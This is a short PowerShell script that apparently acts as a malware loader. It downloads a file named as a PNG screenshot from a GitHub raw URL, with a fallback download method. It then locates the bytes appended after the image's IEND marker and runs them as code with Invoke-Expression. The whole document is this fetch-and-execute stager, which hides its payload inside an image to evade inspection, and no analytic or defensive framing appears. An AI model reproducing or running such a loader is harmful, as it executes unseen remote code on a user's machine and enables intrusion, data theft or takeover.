$u="https://raw.githubusercontent.com/cem324/screenshots/main/IMG_20260922_1042.png"
try{$b=([Net.WebClient]::new()).DownloadData($u)}catch{$w=New-Object -Com WinHttp.WinHttpRequest;$w.Open('GET',$u,0);$w.Send();$b=[byte[]]$w.ResponseBody}
$i=[byte[]]@(0x49,0x45,0x4E,0x44);$p=-1;for($j=0;$j-lt$b.Length-4;$j++){if($b[$j]-eq$i[0]-and$b[$j+1]-eq$i[1]-and$b[$j+2]-eq$i[2]-and$b[$j+3]-eq$i[3]){$p=$j;break}}
if($p-ge0){iex([Text.Encoding]::UTF8.GetString($b,$p+12,$b.Length-$p-12))}